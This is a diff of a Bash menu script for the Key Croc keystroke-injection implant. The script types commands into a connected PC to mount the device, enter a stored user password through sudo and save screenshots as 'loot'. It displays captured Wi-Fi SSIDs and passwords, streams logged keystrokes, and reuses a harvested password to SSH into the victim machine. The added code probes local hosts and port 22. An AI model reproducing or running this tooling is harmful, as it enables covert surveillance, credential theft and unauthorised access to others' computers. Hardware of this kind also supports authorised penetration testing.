-					Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
-					Q ENTER
-					Q ALT-TAB
-					sleep 10
-					ATTACKMODE HID;;
-				  *)
-					Q ALT F2
-					sleep 1
-					Q STRING "xterm"
-					Q ENTER
-					sleep 1
-					Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
-					Q ENTER
-					sleep 1
-					Q STRING "${PC_PW}"
-					Q ENTER
-					sleep 1
-					Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
-					Q ENTER
-					Q ALT-TAB
-					sleep 10
-					ATTACKMODE HID ;;
+	raspberrypi)
+		Q ALT-F4
+		sleep 1
+		Q GUI d
+		Q STRING "terminal"
+		Q ENTER
+		Q ENTER
+		sleep 1
+		Q STRING "PC_PIC=/media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \${PC_PIC} &>/dev/null & exit"
+		Q ENTER
+		Q ALT-TAB
+		Q ALT-TAB
+		sleep 10
+		ATTACKMODE HID;;
+	parrot)
+		Q ALT F2
+		sleep 1
+		Q STRING "mate-terminal"
+		Q ENTER
+		sleep 1
+		Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
+		Q ENTER
+		sleep 1
+		Q STRING "${PC_PW}"
+		Q ENTER
+		sleep 1
+		Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
+		Q ENTER
+		Q ALT-TAB
+		sleep 10
+		ATTACKMODE HID;;
+		*)
+		Q ALT F2
+		sleep 1
+		Q STRING "xterm"
+		Q ENTER
+		sleep 1
+		Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
+		Q ENTER
+		sleep 1
+		Q STRING "${PC_PW}"
+		Q ENTER
+		sleep 1
+		Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
+		Q ENTER
+		Q ALT-TAB
+		sleep 10
+		ATTACKMODE HID ;;
 	esac
 fi ;;
 	[nN] | [nN][oO])
-					echo -ne "$(ColorYellow 'BACK TO CROC POT PLUS MENU')"
-					menu_B ;;
-				  *)
-					invalid_entry ;;
+		echo -ne "$(ColorYellow 'BACK TO CROC POT PLUS MENU')"
+		menu_B ;;
+	*)
+		invalid_entry ;;
 esac
 }
-
 ##
-#   - Croc Pot Plus Menu
+#----Croc Pot Plus Menu
 ##
-
 menu_B() {
 	LED B
 MenuTitle CROC POT PLUS MENU
-MenuColor  1 TCPDUMP SCAN ; echo -ne "             ${clear}\n"
-MenuColor  2 KEYSTORKES LAPTOP WINDOWS ; echo -ne " ${clear}\n"
-MenuColor  3 GETONLINE PAYLOAD WINDOWS ; echo -ne " ${clear}\n"
-MenuColor  4 CROCUNLOCK PAYLOAD WINDOWS ; echo -ne "${clear}\n"
-MenuColor  5 WIFI SETUP PAYLOAD ; echo -ne "        ${clear}\n"
-MenuColor  6 NMAP SCAN ; echo -ne "                ${clear}\n"
-MenuColor  7 WINDOWS INFO SCAN ; echo -ne "         ${clear}\n"
-MenuColor  8 CROC VPN SETUP ; echo -ne "            ${clear}\n"
-MenuColor  9 PASS TIME GAMES ; echo -ne "           ${clear}\n"
+MenuColor 1 TCPDUMP SCAN ; echo -ne "             ${clear}\n"
+MenuColor 2 KEYSTORKES LAPTOP WINDOWS ; echo -ne " ${clear}\n"
+MenuColor 3 GETONLINE PAYLOAD WINDOWS ; echo -ne " ${clear}\n"
+MenuColor 4 CROCUNLOCK PAYLOAD WINDOWS ; echo -ne "${clear}\n"
+MenuColor 5 WIFI SETUP PAYLOAD ; echo -ne "        ${clear}\n"
+MenuColor 6 NMAP SCAN ; echo -ne "                ${clear}\n"
+MenuColor 7 WINDOWS INFO SCAN ; echo -ne "         ${clear}\n"
+MenuColor 8 CROC VPN SETUP ; echo -ne "            ${clear}\n"
+MenuColor 9 PASS TIME GAMES ; echo -ne "           ${clear}\n"
 MenuColor 10 WINDOWS DEFENDER ; echo -ne "        ${clear}\n"
 MenuColor 11 TAKE SCREENSHOT ; echo -ne "         ${clear}\n"
 MenuColor 12 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
@@ -4013,15 +3755,12 @@ MenuEnd
  }
 menu_B
 }
-
 ##
-#   - Croc status menu/function
+#----Croc status menu/function
 ##
-
 function croc_status() {
 	croc_title
 	local server_name=$(hostname)
-
 memory_check() {
 	echo -ne "\n\e[40m$(ColorYellow 'Memory usage on') ${server_name} is:${clear}\n"
 	egrep --color=auto 'Mem|Cache|Swap' /proc/meminfo
@@ -4031,7 +3770,6 @@ memory_check() {
 	df -h
 	iostat
 }
-
 cpu_check() {
 	echo -ne "\n\e[40m$(ColorYellow 'CPU load on') ${server_name} is:${clear}\n"
 	more /proc/cpuinfo && lscpu | grep MHz --color=auto
@@ -4040,30 +3778,25 @@ cpu_check() {
 	echo "Number of CPU/cores online at $HOSTNAME: $(getconf _NPROCESSORS_ONLN)"
 	echo -ne "CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE: $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')"
 }
-
 tcp_check() {
 	echo -ne "\n\e[40m$(ColorYellow 'TCP connections on') ${server_name} is:${clear}\n"
 	netstat -l
 	netstat -r
 	netstat -tunlp
 }
-
 kernel_check() {
 	echo -ne "\n\e[40m$(ColorYellow 'Kernel version on') ${server_name} is:${clear}\n"
 	uname --all
 	hostnamectl
 	cat /proc/version
 }
-
 processes_check() {
 	echo -ne "\n\e[40m$(ColorYellow 'Running Processes') ${server_name} is:${clear}\n"
 	ps -aux
 }
-
 ##
-#   -Status KeyCroc info
+#----Status KeyCroc info
 ##
-
 all_checks() {
 	local LOOT_INFO=/root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt
 	rm -f ${LOOT_INFO}
@@ -4074,17 +3807,15 @@ INTERFACE: $(ip route show default | awk '/default/ {print $5}')\nMODE: $(cat /t
 SYSTEM INFO: $(uname -a)\n${LINE}\nUSB DEVICES:\n$(lsusb -v)\n${LINE}\nBASH VERSION:\n$(apt-cache show bash)\n${LINE}\nLINUX VERSION:\n$(cat /etc/os-release)\n${LINE}\nSSH KEY:\n$(ls -al ~/.ssh)\n$(cat ~/.ssh/id_rsa.pub)\n${LINE}\n
 MEMORY USED:\n$(free -m)\n$(cat /proc/meminfo)\n${LINE}\nSHOW PARTITION FORMAT:\n$(lsblk -a)\n${LINE}\nSHOW DISK USAGE:\n$(df -TH)\n\t${LINE_A}>MORE DETAIL<${LINE_A}\n$(fdisk -l)\n${LINE}\nCHECK USER LOGIN:\n$(lastlog)\n${LINE}\nCURRENT PROCESS:\n$(ps aux)\n${LINE}\nCPU INFORMATION:\n$(more /proc/cpuinfo)\n$(lscpu | grep MHz)\n${LINE}\nCHECK PORT:\n$(netstat -tulpn)\n
 ${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES:\n$(dpkg-query -l)\n${LINE}\nIDENTIFIER (UUID):\n$(blkid)\n${LINE}\nDIRECTORIES:\n$(ls -la -r /etc /var /root /tmp /usr /sys /bin /sbin)\n${LINE}\nDISPLAY TREE:\n$(pstree)\n${LINE}\nSHELL OPTIONS:\n$(shopt)\n${LINE}\n" >> ${LOOT_INFO}
-	cat ${LOOT_INFO}
+cat ${LOOT_INFO}
 }
-
 ##
-#   -Status connected pc info
+#----Status connected pc info
 ##
-
 pc_info() {
 	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "${OS_CHECK}" = WINDOWS ]; then
 	local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
 echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(sed -n 1p ${CROC_OS})
 $(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
@@ -4094,7 +3825,7 @@ $(ColorYellow 'Pc IP is:') $(sed '2,6!d' ${CROC_OS_WIND})
 $(ColorYellow 'Pc SSID + PASSWD and MAC address is:')
 $(sed '9,24!d' ${CROC_OS_WIND})\n"
 else
-	if [ "${OS_CHECK}" = LINUX ]; then
+if [ "${OS_CHECK}" = LINUX ]; then
 	local croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
 echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(sed -n 1p ${CROC_OS})
 $(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
@@ -4105,14 +3836,12 @@ $(ColorYellow 'Pc SSID + PASSWD and MAC address is:')
 $(sed '4,20!d' ${croc_os_v})\n"
 else
 	echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')"
-	fi
+fi
 fi
 }
-
 ##
-#   -Status start live keystorke
+#----Status start live keystorke
 ##
-
 keystorkes_V() {
 	echo -ne "\e[40;5m$(ColorYellow 'PRESS COMTROL + C TO EXIT')${clear}"
 	sleep 2
@@ -4120,47 +3849,43 @@ keystorkes_V() {
 	tail -f croc_char.log
 	menu_A
 }
-
 ##
-#   - nmon monitoring system
+#----nmon monitoring system
 ##
-
 nmon_system() {
 	local pkg=nmon
 	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
-	if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
+if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
 	echo -ne "\e[40m$(ColorBlue 'INSTALL NMON MONITORING YES OR NO AND PRESS [ENTER] ')${clear}"; read mn
 	case $mn in
 	[yY] | [yY][eE][sS])
-						apt install nmon
-						echo -ne "\n\e[40m$(ColorGreen 'NMON MONITORING IS NOW INSTALLED')\n${clear}" ;;
-		[nN] | [nN][oO])
-						echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
-					  *)
-						invalid_entry ; nmon_system ;;
+		apt install nmon
+		echo -ne "\n\e[40m$(ColorGreen 'NMON MONITORING IS NOW INSTALLED')\n${clear}" ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ; nmon_system ;;
 	esac
 else
-	echo -ne "\n\e[40m$(ColorGreen 'NMON MONITORING IS INSTALLED')\n${clear}"
+		echo -ne "\n\e[40m$(ColorGreen 'NMON MONITORING IS INSTALLED')\n${clear}"
 fi
 nmon
 }
-
 ##
-#   - Croc Status Menu
+#----Croc Status Menu
 ##
-
 menu_A() {
 	LED B
 MenuTitle KEYCROC STATUS MENU
-MenuColor  1 MEMORY USAGE ; echo -ne "             ${clear}\n"
-MenuColor  2 CPU LOAD ; echo -ne "                 ${clear}\n"
-MenuColor  3 NUMBER OF TCP CONNECTIONS ; echo -ne "  ${clear}\n"
-MenuColor  4 KERNEL VERSION ; echo -ne "           ${clear}\n"
-MenuColor  5 RUNNING PROCESSES ; echo -ne "        ${clear}\n"
-MenuColor  6 CHECK ALL ; echo -ne "                ${clear}\n"
-MenuColor  7 CONNECTED PC INFO ; echo -ne "         ${clear}\n"
-MenuColor  8 VIEW LIVE KEYSTORKES ; echo -ne "      ${clear}\n"
-MenuColor  9 START NMON MONITORING ; echo -ne "     ${clear}\n"
+MenuColor 1 MEMORY USAGE ; echo -ne "             ${clear}\n"
+MenuColor 2 CPU LOAD ; echo -ne "                 ${clear}\n"
+MenuColor 3 NUMBER OF TCP CONNECTIONS ; echo -ne "  ${clear}\n"
+MenuColor 4 KERNEL VERSION ; echo -ne "           ${clear}\n"
+MenuColor 5 RUNNING PROCESSES ; echo -ne "        ${clear}\n"
+MenuColor 6 CHECK ALL ; echo -ne "                ${clear}\n"
+MenuColor 7 CONNECTED PC INFO ; echo -ne "         ${clear}\n"
+MenuColor 8 VIEW LIVE KEYSTORKES ; echo -ne "      ${clear}\n"
+MenuColor 9 START NMON MONITORING ; echo -ne "     ${clear}\n"
 MenuColor 10 RETURN TO MAIN MENU ; echo -ne "       ${clear}\n"
 MenuEnd
 	read a_c
@@ -4181,20 +3906,16 @@ MenuEnd
  }
 menu_A
 }
-
 ##
-#   - Edit Files Functions
+#----Edit Files Functions
 ##
-
 function croc_edit_menu() {
 	clear
 	LED B
 	croc_title
-
 ##
-#   -Edit Payload files Functions
+#----Edit Payload files Functions
 ##
-
 edit_payload() {
 	cd /root/udisk/payloads
 	ls -R --color=auto
@@ -4202,17 +3923,15 @@ edit_payload() {
 	echo ""
 	read -p "$(ColorBlue 'ENTER THE PAYLOAD NAME TO EDIT AND PRESS [ENTER]:') " user_payload
 	local USER_PAYLOAD_V=${user_payload}
-	if [ -e "${USER_PAYLOAD_V}" ]; then
+if [ -e "${USER_PAYLOAD_V}" ]; then
 	nano ${USER_PAYLOAD_V}
 else
 	invalid_entry
 fi
 }
-
 ##
-#   -Edit Tools files Functions
+#----Edit Tools files Functions
 ##
-
 edit_tools() {
 	cd /root/udisk/tools
 	ls -R --color=auto
@@ -4220,17 +3939,15 @@ edit_tools() {
 	echo ""
 	read -p "$(ColorBlue 'ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]:') " user_tools
 	local USER_TOOLS_V=${user_tools}
-	if [ -e "${USER_TOOLS_V}" ]; then
+if [ -e "${USER_TOOLS_V}" ]; then
 	nano ${USER_TOOLS_V}
 else
 	invalid_entry
 fi
 }
-
 ##
-#   -Edit loot files Functions
+#----Edit loot files Functions
 ##
-
 edit_loot() {
 	cd /root/udisk/loot
 	ls -R --color=auto
@@ -4238,30 +3955,26 @@ edit_loot() {
 	echo ""
 	read -p "$(ColorBlue 'ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]:') " user_loot
 	local USER_LOOT_V=${user_loot}
-	if [ -e "${USER_LOOT_V}" ]; then
+if [ -e "${USER_LOOT_V}" ]; then
 	nano ${USER_LOOT_V}
 else
 	invalid_entry
 fi
 }
-
 ##
-#   -Edit Config files Functions
+#----Edit Config files Functions
 ##
-
 edit_config() {
 	local USER_CONFIG_V=/root/udisk/config.txt
-	if [ -e "${USER_CONFIG_V}" ]; then
+if [ -e "${USER_CONFIG_V}" ]; then
 	nano ${USER_CONFIG_V}
 else
 	invalid_entry
 fi
 }
-
 ##
-#   -Edit Path To file Functions
+#----Edit Path To file Functions
 ##
-
 user_file() {
 	cd
 	ls -aRd $PWD/* --color=auto
@@ -4269,17 +3982,15 @@ user_file() {
 	echo ""
 	read -p "$(ColorBlue 'ENTER THE PATH TO FILE NAME TO EDIT AND PRESS [ENTER]:') " file_edit
 	local USER_FILE_V=${file_edit}
-	if [ -e "${USER_FILE_V}" ]; then
+if [ -e "${USER_FILE_V}" ]; then
 	nano ${USER_FILE_V}
 else
 	invalid_entry
 fi
 }
-
 ##
-#   -Edit remove file Functions
+#----Edit remove file Functions
 ##
-
 remove_file() {
 	cd
 	ls -aRd $PWD/* --color=auto
@@ -4287,7 +3998,7 @@ remove_file() {
 	echo ""
 	read -p "$(ColorRed 'ENTER THE PATH TO FILE NAME YOU WISH TO REMOVE AND PRESS [ENTER]:') " remove_edit
 	local REMOVE_FILE_V=${remove_edit}
-	if [ -e "${REMOVE_FILE_V}" ]; then
+if [ -e "${REMOVE_FILE_V}" ]; then
 	LED R
 	echo -ne ${LINE_}"\e[40;4;5m$(ColorRed 'This file will be removed') ${REMOVE_FILE_V}${clear}"${LINE_}
 	rm -f ${REMOVE_FILE_V}
@@ -4295,63 +4006,55 @@ else
 	invalid_entry
 fi
 }
-
 ##
-#   - midnight commander, visual file manager
+#----midnight commander, visual file manager
 ##
-
 midnight_manager() {
 	clear
 	echo -ne "$(Info_Screen '
 - Midnight Commander, visual file manager\n
 - Check link below on How to use\n
 - https://www.linode.com/docs/guides/how-to-install-midnight-commander\n')${clear}\n"
-
 ##
-#   - midnight install function
+#----midnight install function
 ##
-
 mc_install() {
 	local pkg=mc
 	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "$pkg" 2>&1)"
-	if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
+if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
 	echo -ne "\e[40m$(ColorBlue 'INSTALL MIDNIGHT COMMANDER YES OR NO AND PRESS [ENTER] ')${clear}"; read mc
 	case $mc in
 	[yY] | [yY][eE][sS])
-						apt install mc
-						echo -ne "\n\e[40m$(ColorGreen 'MIDNIGHT COMMANDER IS NOW INSTALLED')\n${clear}" ;;
-		[nN] | [nN][oO])
-						echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
-					  *)
-						invalid_entry ; mc_install ;;
+		apt install mc
+		echo -ne "\n\e[40m$(ColorGreen 'MIDNIGHT COMMANDER IS NOW INSTALLED')\n${clear}" ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'Maybe next time')\n${clear}" ;;
+	*)
+		invalid_entry ; mc_install ;;
 	esac
 else
-	echo -ne "\n\e[40m$(ColorGreen 'MIDNIGHT COMMANDER IS INSTALLED')\n${clear}"
+		echo -ne "\n\e[40m$(ColorGreen 'MIDNIGHT COMMANDER IS INSTALLED')\n${clear}"
 fi
 }
-
 ##
-#   - midnight remove function
+#----midnight remove function
 ##
-
 mc_remove() {
 	echo -ne "\e[40m$(ColorBlue 'REMOVE MIDNIGHT COMMANDER YES OR NO AND PRESS [ENTER] ')${clear}"; read mcr
 	case $mcr in
 	[yY] | [yY][eE][sS])
-						apt-get remove mc
-						apt-get autoremove
-						echo -ne "\n\e[40m$(ColorGreen 'MIDNIGHT COMMANDER IS NOW REMOVED')\n${clear}" ;;
-		[nN] | [nN][oO])
-						echo -ne "\n\e[40m$(ColorYellow 'KEEPING MIDNIGHT COMMANDER')\n${clear}" ;;
-					  *)
-						invalid_entry ; mc_remove ;;
+		apt-get remove mc
+		apt-get autoremove
+		echo -ne "\n\e[40m$(ColorGreen 'MIDNIGHT COMMANDER IS NOW REMOVED')\n${clear}" ;;
+	[nN] | [nN][oO])
+		echo -ne "\n\e[40m$(ColorYellow 'KEEPING MIDNIGHT COMMANDER')\n${clear}" ;;
+	*)
+		invalid_entry ; mc_remove ;;
 	esac
 }
-
 ##
-#   - midnight Menu
+#----midnight Menu
 ##
-
 MenuTitle MIDNIGHT COMMANDER MENU
 MenuColor 1 INSTALL MIDNIGHT COMMANDER ; echo -ne "${clear}\n"
 MenuColor 2 REMOVE MIDNIGHT COMMANDER ; echo -ne " ${clear}\n"
@@ -4367,24 +4070,21 @@ MenuEnd
 	0) exit 0 ;;
 	*) invalid_entry ; midnight_manager ;;
 	esac
-
 }
-
 ##
-#   - Croc Edit Menu
+#----Croc Edit Menu
 ##
-
 	LED B
 MenuTitle CROC EDIT MENU
-MenuColor  1 CROC PAYLOADS FOLDER ; echo -ne "  ${clear}\n"
-MenuColor  2 CROC TOOLS FOLDER ; echo -ne "     ${clear}\n"
-MenuColor  3 CROC LOOT FOLDER ; echo -ne "      ${clear}\n"
-MenuColor  4 CROC CONFIG FILE ; echo -ne "      ${clear}\n"
-MenuColor  5 CROC ENTER FILE NAME ; echo -ne "   ${clear}\n"
-MenuColor  6 CROC REMOVE FILES ; echo -ne "     ${clear}\n"
-MenuColor  7 ATTACKMODE HID STORAGE ; echo -ne "${clear}\n"
-MenuColor  8 ATTACKMODE HID ; echo -ne "       ${clear}\n"
-MenuColor  9 RELOAD_PAYLOADS ; echo -ne "     ${clear}\n"
+MenuColor 1 CROC PAYLOADS FOLDER ; echo -ne "  ${clear}\n"
+MenuColor 2 CROC TOOLS FOLDER ; echo -ne "     ${clear}\n"
+MenuColor 3 CROC LOOT FOLDER ; echo -ne "      ${clear}\n"
+MenuColor 4 CROC CONFIG FILE ; echo -ne "      ${clear}\n"
+MenuColor 5 CROC ENTER FILE NAME ; echo -ne "   ${clear}\n"
+MenuColor 6 CROC REMOVE FILES ; echo -ne "     ${clear}\n"
+MenuColor 7 ATTACKMODE HID STORAGE ; echo -ne "${clear}\n"
+MenuColor 8 ATTACKMODE HID ; echo -ne "       ${clear}\n"
+MenuColor 9 RELOAD_PAYLOADS ; echo -ne "     ${clear}\n"
 MenuColor 10 MIDNIGHT MANAGER ; echo -ne "    ${clear}\n"
 MenuColor 11 RETURN TO MAIN MENU ; echo -ne "   ${clear}\n"
 MenuEnd
@@ -4405,45 +4105,103 @@ MenuEnd
 	*) invalid_entry ; croc_edit_menu ;;
 	esac
 }
-
 ##
-#   - SSH function
+#----SSH function
 ##
-
 function ssh_menu() {
 	local hak_gear=/root/udisk/tools/CROC_POT/Hak5Gear.txt
 	LED B
 	clear
+##
+#----SSH check devices for connection
+##
+check_device() {
+if ping -c1 -w3 ${1} >/dev/null 2>&1; then
+	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;32mCONNECTED IP:${1} ${clear}${4} ${5} ${6} ${7} ${8}\n" >&2
+else
+	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;31mNOT CONNECTED OR CAN'T BE REACHED ${clear}\n" >&2
+fi
+}
+##
+#----SSH get PC ip from Croc_Pot_Payload
+##
+os_connect() {
+	local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
+	local CROC_OS_V=/root/udisk/loot/Croc_OS_ip.txt
+if [ -e "${CROC_OS_WIND}" ]; then
+	echo "$(sed -n 2p ${CROC_OS_WIND})"
+else
+	echo "$(sed -n 2p ${CROC_OS_V})"
+fi
+}
+##
+#----SSH shark jack get ip from Croc_Pot_Payload
+##
+shark_check() {
+	local SHARK_IP=/root/udisk/tools/Croc_Pot/shark_ip.txt
+if [ "$(sed -n '1p' ${SHARK_IP})" != "" ]; then
+	IP_F=$(sed -n '1p' ${SHARK_IP})
+else
+	IP_F=172.16.24.1
+fi
+}
+##
+#----SSH owl get ip from mac
+##
+owl_check() {
+	local OWL_IP=$(arp -a | sed -ne '/00:00:00:00:00:00/p' | sed -e 's/.*(\(.*\)).*/\1/') #place shark jack mac here
+if [[ "${OWL_IP}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
+	IP_O=${OWL_IP}
+else
+	IP_O=172.16.56.1
+fi
+}
+p_ip() {
+	echo -ne "\e[40;93mPublic ip:${clear}\e[40;32m$(curl -s https://api.ipify.org)${clear}"
+}
+##
+#----SSH check PC if port 22 open
+##
+port_check() {
+for PORT in 22; do
+	timeout 1 bash -c "</dev/tcp/$(os_connect)/$PORT &>/dev/null" && echo -ne "\e[40;93mPort:${clear}\e[40;32m$PORT open${clear}"
+done
+}
 	echo -ne "$(Info_Screen '
 -SSH into your HAK5 gear\n
--SSH into connect PC\n')${clear}\n"
-
+-SSH into connect PC\n
+-Ensure your devices are connected to the same local network\n')${clear}\n"
+check_device $(os_connect) CONNECTED PC: $(p_ip) $(port_check)
+check_device 172.16.42.1 WIFI PINEAPPLE:
+check_device 172.16.32.1 SQUIRREL:
+check_device 172.16.84.1 TURTLE:
+shark_check ; check_device ${IP_F} SHARK JACK:
+owl_check ; check_device ${IP_O} OWL:
+check_device 172.16.64.1 BASH BUNNY:
+echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
 ##
-#   - SSH hak5 gear Passwd list
+#----SSH hak5 gear Passwd list
 ##
-
 pw_list() {
-
 hak_list() {
 	echo -ne "\e[40;34mENTER YOUR ${1} ${2} PASSWD AND PRESS [ENTER]:${clear}"
 }
-
 hak_passwd() {
 	unset hakpassword
 	unset hakchartCount
 	while IFS= read -r -n1 -s charr; do
 	case "$charr" in
 	$'\0')
-		break ;;
+	break ;;
 	$'\177')
 		if [ ${#hakpassword} -gt 0 ]; then
-				echo -ne "\b \b"
-				hakpassword=${hakpassword::-1}
-			 fi ;;
-		 *)
-		  hakchartCount=$((hakchartCount+1))
-		  echo -n '*'
-		  hakpassword+="$charr" ;;
+		echo -ne "\b \b"
+		hakpassword=${hakpassword::-1}
+		fi ;;
+	*)
+		hakchartCount=$((hakchartCount+1))
+		echo -n '*'
+		hakpassword+="$charr" ;;
 	esac
 done
 echo $hakpassword >> ${hak_gear}
@@ -4476,24 +4234,20 @@ hak_list SIGNAL OWL ; hak_passwd
 hak_list SHARK JACK ; hak_passwd
 hak_list BASH BUNNY ; hak_passwd
 }
-
 ##
-#   - SSH check for pc passwd
+#----SSH check for pc passwd
 ##
-
 pc_pw() {
 	local pw_check=/root/udisk/loot/Croc_Pot/winpasswd.txt
-	if [ -e "${pw_check}" ]; then
-		echo -ne "$(ColorYellow 'Have An save Passwd we will try this:') $(sed '$!d' ${pw_check})\n"
-	else
-		echo -ne "\e[40;4;5m$(ColorRed 'Run Croc_Unlock Payload to get user passwd')${clear}\n"
-	fi
+if [ -e "${pw_check}" ]; then
+	echo -ne "$(ColorYellow 'Have An save Passwd we will try this:') $(sed '$!d' ${pw_check})\n"
+else
+	echo -ne "\e[40;4;5m$(ColorRed 'Run Croc_Unlock Payload to get user passwd')${clear}\n"
+fi
 }
-
 ##
-#   - SSH to connected pc
+#----SSH to connected pc
 ##
-
 pc_ssh() {
 	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local OS_CHECK=$(sed -n 1p ${CROC_OS})
@@ -4502,7 +4256,7 @@ pc_ssh() {
 	local pw_check=/root/udisk/loot/Croc_Pot/winpasswd.txt
 	pc_pw
 	case $OS_CHECK in
-		WINDOWS)
+	WINDOWS)
 		if [ -e "${pw_check}" ]; then
 	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_WIND})
 \t$(ColorYellow 'The PC IP is:') $(sed -n 2p ${CROC_OS_WIND})
@@ -4515,7 +4269,7 @@ pc_ssh() {
 \t$(ColorYellow 'ENTER PASSWD MANUALLY')\n"
 	ssh $(sed -n 1p ${CROC_OS_WIND})@$(sed -n 2p ${CROC_OS_WIND})
 		fi ;;
-		LINUX)
+	LINUX)
 		if [ -e "${pw_check}" ]; then
 	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_V})
 \t$(ColorYellow 'The PC IP is:') $(sed -n 2p ${CROC_OS_V})
@@ -4528,111 +4282,104 @@ pc_ssh() {
 \t$(ColorYellow 'ENTER PASSWD MANUALLY')\n"
 	ssh $(sed -n 1p ${CROC_OS_V})@$(sed -n 2p ${CROC_OS_V})
 		fi ;;
-		MACOS)
-			echo -ne "\t$(ColorRed 'SORRY NO SUPPORT AT THIS TIME FOR MAC USERS')\n" ;;
-			*)
-			echo -ne "\t$(ColorRed 'SORRY DID NOT FIND VALID OS')\n" ;;
+	MACOS)
+		echo -ne "\t$(ColorRed 'SORRY NO SUPPORT AT THIS TIME FOR MAC USERS')\n" ;;
+	*)
+		echo -ne "\t$(ColorRed 'SORRY DID NOT FIND VALID OS')\n" ;;
 	esac
 }
-
 userinput_ssh() {
 	read -p "$(ColorBlue 'ENTER THE HOST/USER NAME FOR SSH AND PRESS [ENTER]:') " SSH_USER
 	read -p "$(ColorBlue 'ENTER THE IP FOR SSH AND PRESS [ENTER]:') " SSH_IP
 	ssh ${SSH_USER}@${SSH_IP}
 }
-
 ##
-#   - SSH to wifi pineapple
+#----SSH to wifi pineapple
 ##
-
 ssh_pineapple() {
 	clear
 ssh_shell() {
 	read -p "$(ColorBlue 'ENTER WIFI PINEAPPLE IP FOR SSH AND PRESS [ENTER]:') " PINE
-	if [[ "${PINE}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
-	if [ "$(sed -n '1p' ${hak_gear})" != "" ]; then
+if [[ "${PINE}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
+if [ "$(sed -n '1p' ${hak_gear})" != "" ]; then
 	sshpass -p $(sed -n 1p ${hak_gear}) ssh root@${PINE}
-	fi
+fi
 else
-	if [ "$(sed -n '1p' ${hak_gear})" != "" ]; then
+if [ "$(sed -n '1p' ${hak_gear})" != "" ]; then
 	echo -ne "\e[40;4;5m$(ColorRed 'USING WIFI PINEAPPLE DEFAULT IP 172.16.42.1')${clear}"
 	sshpass -p $(sed -n 1p ${hak_gear}) ssh root@172.16.42.1
 else
 	pw_list
-	fi
+fi
 fi
 }
-
 ##
-#   - SSH start wifi pineapple web UI
+#----SSH start wifi pineapple web UI
 ##
-
 pine_web() {
 	echo -ne "\n\e[40m$(ColorYellow 'Starting WIFI Pineapple web page')\n${clear}"
 	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	if [ "${OS_CHECK}" = WINDOWS ]; then
-		Q GUI d
-		Q GUI r
-		sleep 1
-		Q STRING "powershell"
-		Q ENTER
-		sleep 2
